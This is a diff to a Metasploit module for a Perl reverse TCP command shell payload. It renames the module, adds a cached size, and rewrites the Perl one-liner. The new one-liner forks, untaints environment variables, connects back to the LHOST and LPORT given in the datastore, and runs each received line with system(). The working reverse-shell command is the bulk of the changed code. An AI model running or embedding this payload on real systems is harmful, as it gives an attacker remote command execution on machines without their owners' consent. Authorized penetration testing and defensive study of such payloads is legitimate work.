@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,9 @@ require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = 234
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -47,7 +49,7 @@ module Metasploit3
     lhost = datastore['LHOST']
     ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    cmd   = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
   end
 
 end
